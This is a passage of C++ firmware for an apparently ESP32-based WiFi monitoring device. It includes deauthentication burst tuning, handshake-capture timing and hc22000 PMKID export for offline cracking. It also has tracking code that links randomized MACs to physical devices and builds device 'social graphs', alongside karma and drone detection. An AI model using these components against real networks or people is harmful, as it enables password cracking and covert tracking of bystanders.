    // Bit layout: bit0=msg1 bit1=msg2 bit2=msg3 bit3=msg4
    bool hasMsg1 = (msgMask >> 0) & 1;
    bool hasMsg2 = (msgMask >> 1) & 1;
    bool hasMsg3 = (msgMask >> 2) & 1;
    bool hasMsg4 = (msgMask >> 3) & 1;

    if (hasMsg1 && hasMsg2) return true;
    if (hasMsg2 && hasMsg3) return true;
    if (hasMsg2 && hasMsg4) return true;
    return false;
}

uint8_t WiFiManager::_pwnyAdaptiveBurstCount(
        int8_t rssi) const {
    // Close range: fewer frames needed, less noise
    // Far range: more frames needed to penetrate packet loss
    if (rssi >= -50) return 3;
    if (rssi >= -60) return 4;
    if (rssi >= -70) return 6;
    if (rssi >= -80) return 8;
    return 10;
}

uint32_t WiFiManager::_pwnyAdaptivePassiveWindow(
        int networkIdx) const {
    if (networkIdx < 0 || networkIdx >= _networkCount)
        return PWNY_PASSIVE_WINDOW_MS;

    const WiFiNetwork& net = _networks[networkIdx];

    // More clients = more natural handshake traffic = longer passive window
    if (net.clientCount >= 3) return PWNY_PASSIVE_BUSY_MS;
    if (net.clientCount >= 1) return PWNY_PASSIVE_WINDOW_MS;

    // No clients — short passive then skip deauth (nothing to deauth)
    return 2000;
}

void WiFiManager::_pwnyUpdateActivityBitmap(int networkIdx) {
    if (networkIdx < 0 || networkIdx >= _networkCount) return;

    // Get current hour (0-23) from GPS time if available,
    // otherwise use millis-based hour approximation
    uint8_t hour = 0;
    bool gpsOk = false;
    STATE_READ_BEGIN();
    gpsOk = g_state.gpsValid && g_state.gpsTimeISO[0];
    if (gpsOk) {
        // ISO format: YYYY-MM-DDTHH:MM:SSZ
        // Hour is at offset 11
        const char* iso = g_state.gpsTimeISO;
        if (strlen(iso) >= 13) {
            hour = (uint8_t)((iso[11] - '0') * 10 +
                             (iso[12] - '0'));
            if (hour > 23) hour = 0;
        }
    }
    STATE_READ_END();

    if (!gpsOk) {
        // Fallback: millis / 3600000 mod 24
        hour = (uint8_t)((millis() / 3600000UL) % 24);
    }

    // Find or create PwnyTarget for this network
    for (int i = 0; i < _pwnyTargetCount; i++) {
        if (_pwnyTargets[i].networkIdx == (uint8_t)networkIdx) {
            _pwnyTargets[i].activityBitmap |= (1UL << hour);
            return;
        }
    }
}

int16_t WiFiManager::_pwnyTemporalBonus(
        const PwnyTarget& t) const {
    if (t.activityBitmap == 0) return 0;

    // Get current hour
    uint8_t hour = (uint8_t)((millis() / 3600000UL) % 24);

    // Check if current hour has been active before
    if (t.activityBitmap & (1UL << hour)) return 20;

    // Check adjacent hours (±1)
    uint8_t prev = (hour == 0) ? 23 : hour - 1;
    uint8_t next = (hour == 23) ? 0 : hour + 1;
    if ((t.activityBitmap & (1UL << prev)) ||
        (t.activityBitmap & (1UL << next))) return 10;

    // Current time outside known active window — small penalty
    return -5;
}

// ═════════════════════════════════════════════════════════════
//  hc22000 Export
// ═════════════════════════════════════════════════════════════

void WiFiManager::_writeHC22000(const char* ssid,
                                  const char* bssid,
                                  const char* clientMAC,
                                  const uint8_t* pmkid) {
    // Strip colons from MAC strings
    char bssidHex[13]  = "";
    char clientHex[13] = "";
    char pmkidHex[33]  = "";
    char ssidHex[65]   = "";

    int j = 0;
    for (int i = 0; bssid[i] && j < 12; i++) {
        if (bssid[i] != ':')
            bssidHex[j++] = tolower(bssid[i]);
    }
    bssidHex[j] = '\0';

    j = 0;
    for (int i = 0; clientMAC[i] && j < 12; i++) {
        if (clientMAC[i] != ':')
            clientHex[j++] = tolower(clientMAC[i]);
    }
    clientHex[j] = '\0';

    for (int i = 0; i < 16; i++)
        snprintf(pmkidHex + i*2, 3, "%02x", pmkid[i]);

    int ssidLen = strlen(ssid);
    for (int i = 0; i < ssidLen && i < 32; i++)
        snprintf(ssidHex + i*2, 3, "%02x",
                 (uint8_t)ssid[i]);

    // Ensure PMKID directory exists
    if (!LittleFS.exists(PATH_PMKID_DIR))
        LittleFS.mkdir(PATH_PMKID_DIR);

    char path[48];
    snprintf(path, sizeof(path),
             PATH_PMKID_DIR "/%s.hc22000", bssidHex);

    File f = LittleFS.open(path, FILE_APPEND);
    if (!f) {
        DLOG_WARN("WIFI", "hc22000 open failed: %s", path);
        return;
    }

    // WPA*02*{pmkid}*{bssid}*{client}*{ssid_hex}***
    f.printf("WPA*02*%s*%s*%s*%s***\n",
             pmkidHex, bssidHex, clientHex, ssidHex);
    f.close();

    DLOG_INFO("WIFI", "hc22000: %s", path);
}

// ═════════════════════════════════════════════════════════════
//  MAC Utilities
// ═════════════════════════════════════════════════════════════

void WiFiManager::_macToStr(const uint8_t* mac,
                              char* out18) {
    snprintf(out18, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2],
             mac[3], mac[4], mac[5]);
}

bool WiFiManager::_isRandomMAC(const uint8_t* mac) {
    return (mac[0] & 0x02) != 0;
}

bool WiFiManager::_macsEqual(const uint8_t* a,
                               const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

// ═════════════════════════════════════════════════════════════
//  Device / Network Management
// ═════════════════════════════════════════════════════════════

TrackedDevice* WiFiManager::_findOrCreateDevice(
    const char* mac,
    const uint8_t* rawMAC,
    const char* ieFingerprint,
    int8_t rssi) {

    // Search existing
    for (int i = 0; i < _deviceCount; i++) {
        if (strcmp(_devices[i].mac, mac) == 0) {
            _devices[i].rssi     = rssi;
            _devices[i].lastSeen = millis();
            _devices[i].frameCount++;
            return &_devices[i];
        }
    }

    if (_deviceCount >= WIFI_MAX_DEVICES) return nullptr;

    // Create new
    TrackedDevice& dev = _devices[_deviceCount++];
    memset(&dev, 0, sizeof(TrackedDevice));
    strlcpy(dev.mac, mac, sizeof(dev.mac));
    memcpy(dev.rawMAC, rawMAC, 6);
    strlcpy(dev.ieFingerprint, ieFingerprint,
            sizeof(dev.ieFingerprint));
    dev.isRandomMAC = _isRandomMAC(rawMAC);
    dev.rssi        = rssi;
    dev.firstSeen   = millis();
    dev.lastSeen    = millis();
    dev.frameCount  = 1;

    // Queue new device to MQTT
    MQTT_MGR.queueDevice(mac, ieFingerprint, "",
                          rssi, dev.isRandomMAC);

    STATE_WRITE_BEGIN();
    g_state.sessionNetworks++;
    STATE_WRITE_END();

    return &dev;
}

void WiFiManager::_addProbedSSID(TrackedDevice* dev,
                                   const char* ssid) {
    if (!ssid || ssid[0] == '\0') return;

    // Already tracked?
    for (int i = 0; i < dev->probeCount; i++) {
        if (strcmp(dev->probedSSIDs[i], ssid) == 0)
            return;
    }

    if (dev->probeCount < 8) {
        strlcpy(dev->probedSSIDs[dev->probeCount++],
                ssid, 33);
    }

    // Update bloom filter
    dev->ssidBloom |= _ssidBloomHash(ssid);
}

WiFiNetwork* WiFiManager::_findOrCreateNetwork(
    const char* ssid,
    const uint8_t* bssid,
    int8_t rssi,
    uint8_t ch) {

    for (int i = 0; i < _networkCount; i++) {
        if (_macsEqual(_networks[i].bssid, bssid)) {
            _networks[i].rssi    = rssi;
            _networks[i].lastSeen = millis();
            if (!_networks[i].hasPMKID) {
                _networks[i].hasPMKID = _hasStoredCapture(bssid);
            }
            return &_networks[i];
        }
    }

    if (_networkCount >= WIFI_MAX_NETWORKS) {
        // Replace oldest
        int oldest = 0;
        for (int i = 1; i < _networkCount; i++) {
            if (_networks[i].lastSeen < _networks[oldest].lastSeen)
                oldest = i;
        }
        memset(&_networks[oldest], 0, sizeof(WiFiNetwork));
        WiFiNetwork& net = _networks[oldest];
        strlcpy(net.ssid, ssid, sizeof(net.ssid));
        memcpy(net.bssid, bssid, 6);
        net.rssi      = rssi;
        net.channel   = ch;
        net.firstSeen = millis();
        net.lastSeen  = millis();
        net.hasPMKID  = _hasStoredCapture(bssid);
        STATE_WRITE_BEGIN();
        g_state.wifiNetworkCount = _networkCount;
        STATE_WRITE_END();
        return &net;
    }

    WiFiNetwork& net = _networks[_networkCount++];
    memset(&net, 0, sizeof(WiFiNetwork));
    strlcpy(net.ssid, ssid, sizeof(net.ssid));
    memcpy(net.bssid, bssid, 6);
    net.rssi      = rssi;
    net.channel   = ch;
    net.firstSeen = millis();
    net.lastSeen  = millis();
    net.hasPMKID  = _hasStoredCapture(bssid);
    strlcpy(net.security, "OPEN", sizeof(net.security));

    STATE_WRITE_BEGIN();
    g_state.wifiNetworkCount = _networkCount;
    STATE_WRITE_END();

    return &net;
}

const char* WiFiManager::_findSSIDByBSSID(
    const uint8_t* bssid) {
    for (int i = 0; i < _networkCount; i++) {
        if (_macsEqual(_networks[i].bssid, bssid))
            return _networks[i].ssid;
    }
    return nullptr;
}

// ═════════════════════════════════════════════════════════════
//  Behavioral Analysis
// ═════════════════════════════════════════════════════════════

void WiFiManager::_updateBehavior(TrackedDevice* dev) {
    uint32_t now = millis();

    if (dev->lastProbeTime > 0) {
        uint32_t interval = now - dev->lastProbeTime;
        if (interval < 30000) {
            // EMA of probe interval
            if (dev->probeIntervalAvg == 0)
                dev->probeIntervalAvg = interval;
            else
                dev->probeIntervalAvg =
                    (dev->probeIntervalAvg * 7 +
                     interval) / 8;
        }

        // Burst detection: < 500ms between probes = burst
        if (interval < 500) {
            dev->burstCount++;
        } else {
            dev->burstCount = 1;
            dev->burstStartTime = now;
        }
    }
    dev->lastProbeTime = now;
}

void WiFiManager::_updateRSSIHistory(TrackedDevice* dev,
                                       int8_t rssi) {
    uint8_t idx = dev->rssiHead % 8;
    dev->rssiHistory[idx]    = rssi;
    dev->rssiTimestamps[idx] = millis();
    dev->rssiHead++;
    if (dev->rssiCount < 8) dev->rssiCount++;
}

void WiFiManager::_computeRSSITrends() {
    static constexpr uint8_t kRssiHistorySize = 8;
    uint32_t now = millis();
    for (int i = 0; i < _deviceCount; i++) {
        TrackedDevice& dev = _devices[i];
        if (dev.rssiCount < 3) continue;

        // Linear regression on RSSI history
        float sumX = 0, sumY = 0, sumXY = 0, sumX2 = 0;
        int n = dev.rssiCount;

        for (int j = 0; j < n; j++) {
            uint8_t idx = (static_cast<uint8_t>(dev.rssiHead % kRssiHistorySize) +
                           kRssiHistorySize -
                           static_cast<uint8_t>(n) +
                           static_cast<uint8_t>(j)) % kRssiHistorySize;
            float x = (now - dev.rssiTimestamps[idx])
                      / 1000.0f;
            float y = dev.rssiHistory[idx];
            sumX  += x;
            sumY  += y;
            sumXY += x * y;
            sumX2 += x * x;
        }

        float denom = n * sumX2 - sumX * sumX;
        if (fabsf(denom) < 0.001f) {
            dev.rssiTrend = RSSI_TREND_STATIONARY;
            dev.rssiSlope = 0;
            continue;
        }

        float slope = (n * sumXY - sumX * sumY) / denom;
        dev.rssiSlope = slope;

        // Compute variance
        float mean = sumY / n;
        float var  = 0;
        for (int j = 0; j < n; j++) {
            uint8_t idx = (static_cast<uint8_t>(dev.rssiHead % kRssiHistorySize) +
                           kRssiHistorySize -
                           static_cast<uint8_t>(n) +
                           static_cast<uint8_t>(j)) % kRssiHistorySize;
            float diff = dev.rssiHistory[idx] - mean;
            var += diff * diff;
        }
        var /= n;

        if (slope > 0.3f)
            dev.rssiTrend = RSSI_TREND_APPROACHING;
        else if (slope < -0.3f)
            dev.rssiTrend = RSSI_TREND_RETREATING;
        else if (var > 9.0f)
            dev.rssiTrend = RSSI_TREND_ORBITING;
        else
            dev.rssiTrend = RSSI_TREND_STATIONARY;
    }
}

void WiFiManager::_classifyVendor(TrackedDevice* dev,
                                    const uint8_t* tags,
                                    int tagLen) {
    if (dev->vendorClass != VENDOR_UNKNOWN) return;

    int pos = 0;
    while (pos + 2 <= tagLen) {
        uint8_t id = tags[pos];
        uint8_t sz = tags[pos + 1];
        if (pos + 2 + sz > tagLen) break;

        if (id == 221 && sz >= 3) {
            const uint8_t* oui = tags + pos + 2;
            // Apple: 00:17:f2, 00:50:e4
            if (oui[0]==0x00 && oui[1]==0x17 &&
                oui[2]==0xf2) {
                dev->vendorClass = VENDOR_APPLE; return;
            }
            // Samsung: 00:16:32
            if (oui[0]==0x00 && oui[1]==0x16 &&
                oui[2]==0x32) {
                dev->vendorClass = VENDOR_SAMSUNG; return;
            }
            // Microsoft: 00:50:f2
            if (oui[0]==0x00 && oui[1]==0x50 &&
                oui[2]==0xf2) {
                dev->vendorClass = VENDOR_MICROSOFT; return;
            }
        }
        pos += 2 + sz;
    }
}

uint32_t WiFiManager::_ssidBloomHash(const char* ssid) {
    // FNV-1a into 32-bit bloom position
    uint32_t h = 0x811c9dc5;
    while (*ssid) {
        h ^= (uint8_t)*ssid++;
        h *= 0x01000193;
    }
    return 1u << (h & 31);
}

float WiFiManager::_bloomJaccard(uint32_t a, uint32_t b) {
    uint32_t intersect = __builtin_popcount(a & b);
    uint32_t unionBits = __builtin_popcount(a | b);
    if (unionBits == 0) return 0.0f;
    return (float)intersect / unionBits;
}

// ═════════════════════════════════════════════════════════════
//  MAC Rotation / Graveyard
// ═════════════════════════════════════════════════════════════

void WiFiManager::_checkGraveyard(TrackedDevice* dev) {
    if (!dev->isRandomMAC) return;

    for (int i = 0; i < _graveCount; i++) {
        DeviceGrave& g = _graveyard[i];

        // IE fingerprint match
        bool fpMatch = (strlen(dev->ieFingerprint) > 0 &&
                        strcmp(dev->ieFingerprint,
                               g.ieFingerprint) == 0);

        // Bloom filter Jaccard
        float j = _bloomJaccard(dev->ssidBloom, g.ssidBloom);

        // Temporal: appeared within 300s of death
        bool temporal = (millis() - g.deathTime < 300000);

        if ((fpMatch || j >= 0.6f) && temporal) {
            // Same physical device — link IDs
            if (g.physicalDeviceID != 0) {
                dev->physicalDeviceID = g.physicalDeviceID;
            } else {
                dev->physicalDeviceID = _nextPhysicalID++;
                g.physicalDeviceID    = dev->physicalDeviceID;
            }
            char oldMacStr[18];
            _macToStr(g.rawMAC, oldMacStr);
            if (_macsEqual(g.rawMAC, dev->rawMAC)) {
                DLOG_INFO("WIFI", "MAC rotation skipped: %s (phys ID %d)",
                          oldMacStr, dev->physicalDeviceID);
            } else {
                DLOG_INFO("WIFI", "MAC rotation: %s -> %s (phys ID %d)",
                          oldMacStr, dev->mac,
                          dev->physicalDeviceID);
            }
            return;
        }
    }
}

void WiFiManager::_buryDevice(int idx) {
    if (idx < 0 || idx >= _deviceCount) return;
    TrackedDevice& dev = _devices[idx];

    int slot = _graveCount < WIFI_GRAVE_SIZE ?
               _graveCount++ :
               (_graveCount - 1) % WIFI_GRAVE_SIZE;

    DeviceGrave& g = _graveyard[slot];
    memcpy(g.rawMAC, dev.rawMAC, 6);
    strlcpy(g.ieFingerprint, dev.ieFingerprint,
            sizeof(g.ieFingerprint));
    g.ieOrderHash      = dev.ieOrderHash;
    g.ssidBloom        = dev.ssidBloom;
    g.probeIntervalAvg = dev.probeIntervalAvg;
    g.physicalDeviceID = dev.physicalDeviceID;
    g.lastSeqNum       = dev.lastSeqNum;
    g.deathTime        = millis();
}

void WiFiManager::_ageDevices() {
    uint32_t now = millis();
    int i = 0;
    while (i < _deviceCount) {
        if (now - _devices[i].lastSeen > DEVICE_TIMEOUT_MS) {
            _buryDevice(i);
            // Compact array
            if (i < _deviceCount - 1) {
                _devices[i] = _devices[_deviceCount - 1];
            }
            _deviceCount--;
        } else {
            i++;
        }
    }
    // Evict clients not seen in 2 minutes
    const uint32_t CLIENT_TIMEOUT_MS = 120000;
    for (int i = 0; i < _networkCount; i++) {
        WiFiNetwork& net = _networks[i];
        for (int c = 0; c < net.clientCount; c++) {
            if (now - net.clientLastSeen[c] >
                CLIENT_TIMEOUT_MS) {
                // Shift remaining clients down
                for (int k = c; k < net.clientCount - 1; k++) {
                    memcpy(net.clientMACs[k],
                           net.clientMACs[k+1], 6);
                    net.clientRSSI[k]     =
                        net.clientRSSI[k+1];
                    net.clientLastSeen[k] =
                        net.clientLastSeen[k+1];
                }
                net.clientCount--;
                c--; // recheck this index
            }
        }
    }
}

// ═════════════════════════════════════════════════════════════
//  Social Graph
// ═════════════════════════════════════════════════════════════

void WiFiManager::_updateSocialGraph() {
    _affinityPairCount = 0;

    for (int a = 0; a < _deviceCount; a++) {
        for (int b = a + 1; b < _deviceCount; b++) {
            if (_devices[a].ssidBloom == 0 ||
                _devices[b].ssidBloom == 0) continue;

            float j = _bloomJaccard(_devices[a].ssidBloom,
                                     _devices[b].ssidBloom);
            if (j >= 0.5f &&
                _affinityPairCount < WIFI_MAX_AFFINITY) {
                AffinityPair& pair =
                    _affinityPairs[_affinityPairCount++];
                pair.indexA  = a;
                pair.indexB  = b;
                pair.jaccard = j;
            }
        }
    }
}

// ═════════════════════════════════════════════════════════════
//  Karma / Evil-Twin Detection
// ═════════════════════════════════════════════════════════════

void WiFiManager::_recordRecentProbe(const char* ssid,
                                       const uint8_t* mac,
                                       int8_t rssi) {
    RecentProbe& rp =
        _recentProbes[_recentProbeHead % WIFI_RECENT_PROBE_COUNT];
    strlcpy(rp.ssid, ssid, sizeof(rp.ssid));
    memcpy(rp.mac, mac, 6);
    rp.rssi      = rssi;
    rp.timestamp = millis();
    _recentProbeHead++;
}

void WiFiManager::_checkKarma(const char* ssid,
                                const uint8_t* bssid,
                                int8_t rssi,
                                bool isNewNetwork) {
    if (millis() < 10000) return;
    if (!isNewNetwork) return;

    uint32_t now = millis();

    for (int i = 0; i < WIFI_RECENT_PROBE_COUNT; i++) {
        RecentProbe& rp = _recentProbes[i];
        if (rp.timestamp == 0) continue;
        if (now - rp.timestamp > 30000) continue;
        if (strcmp(rp.ssid, ssid) != 0) continue;

        // New AP appeared for an SSID that was just probed
        if (_karmaAlertCount < WIFI_MAX_KARMA) {
            KarmaAlert& ka =
                _karmaAlerts[_karmaAlertCount++];
            strlcpy(ka.ssid, ssid, sizeof(ka.ssid));
            memcpy(ka.suspectBSSID, bssid, 6);
            memcpy(ka.victimMAC, rp.mac, 6);
            ka.beaconRSSI = rssi;
            ka.timestamp  = now;
            _karmaAlertNew = true;

            char notifText[48];
            snprintf(notifText, sizeof(notifText), "KARMA: %s", ssid);
            _queueWiFiNotification(NOTIF_DEVICE_NEW, notifText);

            DLOG_WARN("WIFI", "KARMA alert: %s", ssid);
        }
        break;
    }
}

// ═════════════════════════════════════════════════════════════
//  Analytics
// ═════════════════════════════════════════════════════════════

int WiFiManager::getEstimatedPhysicalDevices() {
    // Count unique physical IDs plus unlinked randoms
    int physicalIDs[WIFI_MAX_DEVICES] = {};
    int uniqueCount = 0;
    int unlinked    = 0;

    for (int i = 0; i < _deviceCount; i++) {
        if (!_devices[i].isRandomMAC) {
            uniqueCount++;
            continue;
        }
        if (_devices[i].physicalDeviceID == 0) {
            unlinked++;
        } else {
            bool found = false;
            for (int j = 0; j < uniqueCount; j++) {
                if (physicalIDs[j] ==
                    _devices[i].physicalDeviceID) {
                    found = true;
                    break;
                }
            }
            if (!found)
                physicalIDs[uniqueCount++] =
                    _devices[i].physicalDeviceID;
        }
    }
    return uniqueCount + unlinked;
}

void WiFiManager::resetCounters() {
    _totalFrames      = 0;
    _mgmtFrames       = 0;
    _dataFrames       = 0;
    _probePacketCount = 0;
    _deauthCount      = 0;
    _deauthFlood      = false;
    memset(_channelActivity, 0, sizeof(_channelActivity));
}

// ═════════════════════════════════════════════════════════════
//  State sync
// ═════════════════════════════════════════════════════════════

void WiFiManager::_syncState() {
    bool emitDroneNotification = false;
    char droneNotifText[48] = {};

    STATE_WRITE_BEGIN();
    g_state.wifiChannel      = _channel;
    g_state.wifiOpMode       = _mode;
    g_state.wifiNetworkCount = _networkCount;
    g_state.probeDeviceCount = _deviceCount;
    g_state.probePacketCount = _probePacketCount;
    g_state.pmkidCaptured    = _pmkidCount;

    // Snapshot networks for display
    int snapCount = _networkCount;
    if (snapCount > SpectreState::WIFI_SNAP_COUNT) {
        snapCount = SpectreState::WIFI_SNAP_COUNT;
    }
    g_state.wifiSnapCount = snapCount;
    for (int i = 0; i < snapCount; i++) {
        strlcpy(g_state.wifiSnap[i].ssid,
                _networks[i].ssid, 33);
        memcpy(g_state.wifiSnap[i].bssid,
               _networks[i].bssid, 6);
        g_state.wifiSnap[i].rssi     = _networks[i].rssi;
        g_state.wifiSnap[i].channel  = _networks[i].channel;
        g_state.wifiSnap[i].hasPMKID = _networks[i].hasPMKID;
        g_state.wifiSnap[i].clientCount =
            _networks[i].clientCount;
        strlcpy(g_state.wifiSnap[i].security,
                _networks[i].security, 12);
        g_state.wifiSnap[i].isHidden = _networks[i].isHidden;
        g_state.wifiSnap[i].clientCount  = _networks[i].clientCount;
    }

    if (_droneDetected) {
        uint32_t now = millis();
        if (now - _lastDroneTime >= 5000) {
            _lastDroneTime = now;
            g_state.droneAlert   = true;
            g_state.droneCount++;
            strlcpy(g_state.lastDroneID, _lastDroneID,
                    sizeof(g_state.lastDroneID));
            _droneDetected = false;
            emitDroneNotification = true;
            snprintf(droneNotifText, sizeof(droneNotifText),
                     "DRONE: %s", _lastDroneID);
        }
    }

    STATE_WRITE_END();

    if (emitDroneNotification) {
        _queueWiFiNotification(NOTIF_DRONE, droneNotifText);
    }
    static bool lastAntState = WIFI_ANTENNA_DEFAULT_EXTERNAL;
    bool requestedAntState = lastAntState;
    STATE_READ_BEGIN();
    requestedAntState = g_state.antennaExternal;
    STATE_READ_END();
    if (requestedAntState != lastAntState) {
        if (!s_antennaManager.isAvailable()) {
            STATE_WRITE_BEGIN();
            g_state.antennaExternal = lastAntState;
            STATE_WRITE_END();
            return;
        }

        const bool applied = setExternalAntenna(requestedAntState);
        if (!applied || s_antennaManager.isExternal() != requestedAntState) {
            STATE_WRITE_BEGIN();
            g_state.antennaExternal = s_antennaManager.isExternal();
            STATE_WRITE_END();
        }
        lastAntState = s_antennaManager.isExternal();
    }
}

bool WiFiManager::_isTrustedSSID(const char* ssid) const {
    if (!ssid || !ssid[0] || !SETTINGS.isReady()) {
        return false;
    }

    const RuntimeSettings& settings = SETTINGS.get();
    for (uint8_t i = 0; i < settings.wifiNetworkCount; i++) {
        if (strcmp(ssid, settings.wifiNetworks[i].ssid) == 0) {
            return true;
        }
    }
    return false;
}

void WiFiManager::_logEvent(const char* eventType,
                              const char* detail) {
    MQTT_MGR.queueEvent(eventType, "INFO", "", "",
                         detail, "detection");
}





